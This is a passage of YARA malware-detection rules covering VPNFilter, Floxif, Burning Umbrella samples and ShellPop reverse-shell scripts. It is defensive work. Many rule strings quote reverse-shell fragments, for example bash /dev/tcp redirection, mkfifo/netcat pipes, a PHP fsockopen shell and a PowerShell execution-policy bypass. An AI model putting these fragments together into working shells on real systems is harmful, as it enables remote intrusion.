https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f8286e29faa67ec765ae0244862f6b7914fcdde10423f96595cb84ad5cc6b344\"\n      tags = \"APT, DEMO, FILE, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Login=\" fullword ascii\n      $s2 = \"Password=\" fullword ascii\n      $s3 = \"%s/rep_%u.bin\" fullword ascii\n      $s4 = \"%s:%uh->%s:%hu\" fullword ascii\n      $s5 = \"Password required\" fullword ascii\n      $s6 = \"password=\" fullword ascii\n      $s7 = \"Authorization: Basic\" fullword ascii\n      $s8 = \"/tmUnblock.cgi\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 100KB and all of them\n}\n\nrule MAL_ELF_VPNFilter_2_RID2D6B : APT DEMO FILE LINUX MAL {\n   meta:\n      description = \"Detects VPNFilter malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-24 10:31:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"50ac4fcd3fbc8abcaa766449841b3a0a684b3e217fc40935f1ac22c34c58a9ec\"\n      tags = \"APT, DEMO, FILE, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0)\" fullword ascii\n      $s2 = \"passwordPASSWORDpassword\" fullword ascii\n      $s3 = \"/tmp/client.key\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 1000KB and all of them\n}\n\nrule MAL_ELF_VPNFilter_3_RID2D6C : APT DEMO FILE LINUX MAL {\n   meta:\n      description = \"Detects VPNFilter malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-24 10:31:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0e0094d9bd396a6594da8e21911a3982cd737b445f591581560d766755097d92\"\n      hash2 = \"9683b04123d7e9fe4c8c26c69b09c2233f7e1440f828837422ce330040782d17\"\n      hash3 = \"37e29b0ea7a9b97597385a12f525e13c3a7d02ba4161a6946f2a7d978cc045b4\"\n      tags = \"APT, DEMO, FILE, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sx1 = \"User-Agent: Mozilla/6.1 (compatible; MSIE 9.0; Windows NT 5.3; Trident/5.0)\" fullword ascii\n      $sx2 = \"Execute by shell[%d]:\" fullword ascii\n      $sx3 = \"CONFIG.TOR.name:\" fullword ascii\n      $s1 = \"Executing command:  %s %s...\" fullword ascii\n      $s2 = \"/proc/%d/cmdline\" fullword ascii\n      $a1 = \"Mozilla/5.0 Firefox/50.0\" fullword ascii\n      $a2 = \"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0\" fullword ascii\n      $a3 = \"Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 1000KB and ( 1 of ( $sx* ) or 2 of ( $s* ) or 2 of ( $a* ) )\n}\n\nrule SUSP_ELF_Tor_Client_RID2DE4 : APT DEMO FILE LINUX SUSP {\n   meta:\n      description = \"Detects ELF Linux Tor client\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-24 10:51:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"afd281639e26a717aead65b1886f98d6d6c258736016023b4e59de30b7348719\"\n      tags = \"APT, DEMO, FILE, LINUX, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"We needed to load a secret key from %s, but it was encrypted. Try 'tor --keygen' instead, so you can enter the passphrase.\" fullword ascii\n      $x2 = \"Received a VERSION cell with odd payload length %d; closing connection.\" fullword ascii\n      $x3 = \"Please upgrade! This version of Tor (%s) is %s, according to the directory authorities. Recommended versions are: %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and 1 of them\n}\n\nrule HKTL_shellpop_TCLsh_RID2E27 : DEMO HKTL {\n   meta:\n      description = \"Detects suspicious TCLsh popshell\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 11:02:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9f49d76d70d14bbe639a3c16763d3b4bee92c622ecb1c351cb4ea4371561e133\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"{ puts -nonewline $s \\\"shell>\\\";flush $s;gets $s c;set e \\\"exec $c\\\";if\" ascii\n   condition: \n      filesize < 1KB and 1 of them\n}\n\nrule HKTL_shellpop_ruby_RID2E2B : DEMO HKTL {\n   meta:\n      description = \"Detects suspicious ruby shellpop\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 11:03:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6b425b37f3520fd8c778928cc160134a293db0ce6d691e56a27894354b04f783\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \");while(cmd=c.gets);IO.popen(cmd,'r'){\" ascii\n   condition: \n      filesize < 1KB and all of them\n}\n\nrule HKTL_shellpop_awk_RID2DAC : DEMO HKTL {\n   meta:\n      description = \"Detects suspicious AWK Shellpop\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 10:41:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7513a0a0ba786b0e22a9a7413491b4011f60af11253c596fa6857fb92a6736fc\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"awk 'BEGIN {s = \\\"/inet/tcp/0/\" ascii\n      $s2 = \"; while(42) \" ascii\n   condition: \n      filesize < 1KB and 1 of them\n}\n\nrule HKTL_shellpop_socat_RID2E83 : DEMO HKTL {\n   meta:\n      description = \"Detects suspicious socat popshell\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 11:17:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"267f69858a5490efb236628260b275ad4bbfeebf4a83fab8776e333ca706a6a0\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"socat tcp-connect\" ascii\n      $s2 = \",pty,stderr,setsid,sigint,sane\" ascii\n   condition: \n      filesize < 1KB and 2 of them\n}\n\nrule HKTL_shellpop_Netcat_UDP_RID3010 : DEMO HKTL {\n   meta:\n      description = \"Detects suspicious netcat popshell\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 12:23:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d823ad91b315c25893ce8627af285bcf4e161f9bbf7c070ee2565545084e88be\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mkfifo fifo ; nc.traditional -u\" ascii\n      $s2 = \"< fifo | { bash -i; } > fifo\" fullword ascii\n   condition: \n      filesize < 1KB and 1 of them\n}\n\nrule HKTL_shellpop_Perl_RID2DFC : DEMO HKTL SCRIPT {\n   meta:\n      description = \"Detects Shellpop Perl script\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 10:55:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"32c3e287969398a070adaad9b819ee9228174c9cb318d230331d33cda51314eb\"\n      tags = \"DEMO, HKTL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"perl -e 'use IO::Socket::INET;$|=1;my ($s,$r);\" ascii\n      $ = \";STDIN->fdopen(\\\\$c,r);$~->fdopen(\\\\$c,w);s\" ascii\n   condition: \n      filesize < 2KB and 1 of them\n}\n\nrule HKTL_shellpop_Python_RID2EEB : DEMO HKTL SCRIPT T1059_006 T1070_003 {\n   meta:\n      description = \"Detects malicious python shell\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 11:35:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"aee1c9e45a1edb5e462522e266256f68313e2ff5956a55f0a84f33bc6baa980b\"\n      tags = \"DEMO, HKTL, SCRIPT, T1059_006, T1070_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"os.putenv('HISTFILE', '/dev/null');\" ascii\n   condition: \n      filesize < 2KB and 1 of them\n}\n\nrule HKTL_shellpop_PHP_TCP_RID2E97 : DEMO HKTL SCRIPT T1505_003 {\n   meta:\n      description = \"Detects malicious PHP shell\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 11:21:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0412e1ab9c672abecb3979a401f67d35a4a830c65f34bdee3f87e87d060f0290\"\n      tags = \"DEMO, HKTL, SCRIPT, T1505_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"php -r \\\"\\\\$sock=fsockopen\" ascii\n      $x2 = \";exec('/bin/sh -i <&3 >&3 2>&3');\\\"\" ascii\n   condition: \n      filesize < 3KB and all of them\n}\n\nrule HKTL_shellpop_Powershell_TCP_RID31D4 : DEMO HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"Detects malicious powershell\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 13:39:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8328806700696ffe8cc37a0b81a67a6e9c86bb416364805b8aceaee5db17333f\"\n      tags = \"DEMO, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"Something went wrong with execution of command on the target\" ascii\n      $ = \";[byte[]]$bytes = 0..65535|%{0};$sendbytes =\" ascii\n   condition: \n      filesize < 3KB and 1 of them\n}\n\nrule SUSP_Powershell_ShellCommand_May18_1_RID3475 : DEMO HKTL SCRIPT SUSP T1059_001 {\n   meta:\n      description = \"Detects a supcicious powershell commandline\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 15:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8328806700696ffe8cc37a0b81a67a6e9c86bb416364805b8aceaee5db17333f\"\n      tags = \"DEMO, HKTL, SCRIPT, SUSP, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"powershell -nop -ep bypass -Command\" ascii\n   condition: \n      filesize < 3KB and 1 of them\n}\n\nrule HKTL_shellpop_Telnet_TCP_RID301B : DEMO HKTL SCRIPT {\n   meta:\n      description = \"Detects malicious telnet shell\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 12:25:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cf5232bae0364606361adafab32f19cf56764a9d3aef94890dda9f7fcd684a0e\"\n      tags = \"DEMO, HKTL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"if [ -e /tmp/f ]; then rm /tmp/f;\" ascii\n      $x2 = \"0</tmp/f|/bin/bash 1>/tmp/f\" fullword ascii\n   condition: \n      filesize < 3KB and 1 of them\n}\n\nrule SUSP_shellpop_Bash_RID2DFF : DEMO HKTL SCRIPT SUSP T1059_004 {\n   meta:\n      description = \"Detects susupicious bash command\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 10:55:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2025-04-11\"\n      hash1 = \"36fad575a8bc459d0c2e3ad626e97d5cf4f5f8bedc56b3cc27dd2f7d88ed889b\"\n      id = \"771b7d01-272a-5986-af07-7417b84c52ed\"\n      tags = \"DEMO, HKTL, SCRIPT, SUSP, T1059_004\"\n      minimum_yara = \"4.0.0\"\n      \n   strings:\n      $x1 = \"bash -i >& /dev/tcp/\" ascii\n      $x2 = \"bash -i >& /dev/tcp/\" ascii base64\n      $fp1 = \"bash -i >& /dev/tcp/IP/PORT\" ascii\n   condition: \n      1 of ( $x* ) and not 1 of ( $fp* )\n}\n\nrule HKTL_shellpop_netcat_RID2EE8 : DEMO HKTL {\n   meta:\n      description = \"Detects suspcious netcat shellpop\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/0x00-0x00/ShellPop\"\n      date = \"2018-05-18 11:34:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"98e3324f4c096bb1e5533114249a9e5c43c7913afa3070488b16d5b209e015ee\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if [ -e /tmp/f ]; then rm /tmp/f;\" ascii\n      $s2 = \"fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc\" ascii\n      $s4 = \"mknod /tmp/f p && nc\" ascii\n      $s5 = \"</tmp/f|/bin/bash 1>/tmp/f\" ascii\n   condition: \n      filesize < 2KB and 1 of them\n}\n\nrule SUSP_LNK_File_PathTraversal_RID311F : DEMO FILE SUSP T1210 T1547_009 {\n   meta:\n      description = \"Detects a suspicious link file that references a file multiple folders lower than the link itself\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/05/deep-dive-into-rig-exploit-kit-delivering-grobios-trojan.html\"\n      date = \"2018-05-16 13:09:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, SUSP, T1210, T1547_009\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"..\\\\..\\\\..\\\\..\\\\..\\\\\" \n   condition: \n      uint16 ( 0 ) == 0x004c and uint32 ( 4 ) == 0x00021401 and ( filesize < 1KB and all of them )\n}\n\nrule MAL_Floxif_Generic_RID2DCE : DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects Floxif Malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-11 10:47:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"de055a89de246e629a8694bde18af2b1605e4b9b493c7e4aef669dd67acf5085\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == \"2f4ddcfebbcad3bacadc879747151f6f\" or pe.exports ( \"FloodFix\" ) or pe.exports ( \"FloodFix2\" ) )\n}\n\nrule MAL_CN_FlyStudio_May18_1_RID2F5C : CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware / hacktool detected in May 2018\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-11 11:53:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b85147366890598518d4f277d44506eef871fd7fc6050d8f8e68889cae066d9e\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"WTNE / MADE BY E COMPILER - WUTAO \" fullword ascii\n      $s2 = \"www.cfyhack.cn\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and ( pe.imphash ( ) == \"65ae5cf17140aeaf91e3e9911da0ee3e\" or 1 of them )\n}\n\nrule SUSP_Microsoft_Copyright_String_Anomaly_2_RID3720 : ANOMALY DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects Floxif Malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-11 17:25:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"de055a89de246e629a8694bde18af2b1605e4b9b493c7e4aef669dd67acf5085\"\n      tags = \"ANOMALY, DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Microsoft(C) Windows(C) Operating System\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them\n}\n\nrule MAL_BurningUmbrella_Sample_1_RID31A4 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:31:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fcfe8fcf054bd8b19226d592617425e320e4a5bb4798807d6f067c39dfc6d1ff\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = { 40 00 00 E0 75 68 66 61 6F 68 6C 79 } \n      $s2 = { 40 00 00 E0 64 6A 7A 66 63 6D 77 62 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and ( pe.imphash ( ) == \"baa93d47220682c04d92f7797d9224ce\" and $s1 in ( 0 .. 1024 ) and $s2 in ( 0 .. 1024 ) )\n}\n\nrule MAL_BurningUmbrella_Sample_2_RID31A5 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"801a64a730fc8d80e17e59e93533c1455686ca778e6ba99cf6f1971a935eda4c\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 40 00 00 E0 63 68 72 6F 6D 67 75 78 } \n      $s2 = { 40 00 00 E0 77 62 68 75 74 66 6F 61 } \n      $s3 = \"ActiveX Manager\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and $s1 in ( 0 .. 1024 ) and $s2 in ( 0 .. 1024 ) and $s3\n}\n\nrule MAL_BurningUmbrella_Sample_3_RID31A6 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:31:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"92efbecc24fbb5690708926b6221b241b10bdfe3dd0375d663b051283d0de30f\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"HKEY_CLASSES_ROOT\\\\Word.Document.8\\\\shell\\\\Open\\\\command\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them\n}\n\nrule MAL_BurningUmbrella_Sample_4_RID31A7 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a1629e8abce9d670fdb66fa1ef73ad4181706eefb8adc8a9fd257b6a21be48c6\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $x1 = \"dumpodbc.exe\" fullword ascii\n      $x2 = \"photo_Bundle.exe\" fullword ascii\n      $x3 = \"Connect 2 fails : %d,%s:%d\" fullword ascii\n      $x4 = \"Connect fails 1 : %d %s:%d\" fullword ascii\n      $x5 = \"New IP : %s,New Port: %d\" fullword ascii\n      $x6 = \"Micrsoft Corporation. All rights reserved.\" fullword wide\n      $x7 = \"New ConFails : %d\" fullword ascii\n      $s1 = \"cmd /c net stop stisvc\" fullword ascii\n      $s2 = \"cmd /c net stop spooler\" fullword ascii\n      $s3 = \"\\\\temp\\\\s%d.dat\" ascii\n      $s4 = \"cmd /c net stop wuauserv\" fullword ascii\n      $s5 = \"User-Agent: MyApp/0.1\" fullword ascii\n      $s6 = \"%s->%s Fails : %d\" fullword ascii\n      $s7 = \"Enter WorkThread,Current sock:%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and ( ( pe.exports ( \"Print32\" ) and 2 of them ) or 1 of ( $x* ) or 4 of them )\n}\n\nrule MAL_BurningUmbrella_Sample_6_RID31A9 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:32:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"49ef2b98b414c321bcdbab107b8fa71a537958fe1e05ae62aaa01fe7773c3b4b\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ExecuteFile=\\\"hidcon:nowait:\\\\\\\"Word\\\\\\\\r.bat\\\\\\\"\\\"\" fullword ascii\n      $s2 = \"InstallPath=\\\"%Appdata%\\\\\\\\Microsoft\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them\n}\n\nrule MAL_BurningUmbrella_Sample_7_RID31AA : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:32:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a4ce3a356d61fbbb067e1430b8ceedbe8965e0cfedd8fb43f1f719e2925b094a\"\n      hash2 = \"a8bfc1e013f15bc395aa5c047f22ff2344c343c22d420804b6d2f0a67eb6db64\"\n      hash3 = \"959612f2a9a8ce454c144d6aef10dd326b201336a85e69a604e6b3892892d7ed\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and pe.imphash ( ) == \"f5b113d6708a3927b5cc48f2215fcaff\"\n}\n\nrule MAL_BurningUmbrella_Sample_8_RID31AB : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:32:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"73270fe9bca94fead1b5b38ddf69fae6a42e574e3150d3e3ab369f5d37d93d88\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd /c open %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them\n}\n\nrule MAL_BurningUmbrella_Sample_10_RID31D4 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"70992a72412c5d62d003a29c3967fcb0687189d3290ebbc8671fa630829f6694\"\n      hash2 = \"48f0bbc3b679aac6b1a71c06f19bb182123e74df8bb0b6b04ebe99100c57a41e\"\n      hash3 = \"5475ae24c4eeadcbd49fcd891ce64d0fe5d9738f1c10ba2ac7e6235da97d3926\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"revjj.syshell.org\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule MAL_BurningUmbrella_Sample_11_RID31D5 : APT DEMO FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"278e9d130678615d0fee4d7dd432f0dda6d52b0719649ee58cbdca097e997c3f\"\n      tags = \"APT, DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Resume.app/Contents/Java/Resume.jarPK\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 700KB and 1 of them\n}\n\nrule MAL_BurningUmbrella_Sample_12_RID31D6 : APT DEMO EXE FILE MAL T1218_011 T1543_003 {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b9aba520eeaf6511877c1eec5f7d71e0eea017312a104f30d3b8f17c89db47e8\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1218_011, T1543_003\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $s1 = \"%SystemRoot%\\\\System32\\\\qmgr.dll\" fullword ascii\n      $s2 = \"rundll32.exe %s,Startup\" fullword ascii\n      $s3 = \"nvsvcs.dll\" fullword wide\n      $s4 = \"SYSTEM\\\\CurrentControlSet\\\\services\\\\BITS\\\\Parameters\" fullword ascii\n      $s5 = \"http://www.sginternet.net 0\" fullword ascii\n      $s6 = \"Microsoft Corporation. All rights reserved.\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 80KB and ( pe.exports ( \"SvcServiceMain\" ) and 5 of them )\n}\n\nrule MAL_BurningUmbrella_Sample_13_RID31D7 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d31374adc0b96a8a8b56438bbbc313061fd305ecee32a12738dd965910c8890f\"\n      hash2 = \"c74a8e6c88f8501fb066ae07753efe8d267afb006f555811083c51c7f546cb67\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and pe.imphash ( ) == \"75f201aa8b18e1c4f826b2fe0963b84f\"\n}\n\nrule MAL_BurningUmbrella_Sample_14_RID31D8 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"388ef4b4e12a04eab451bd6393860b8d12948f2bce12e5c9022996a9167f4972\"\n      tags = \"APT, DEMO, EXE, FILE, 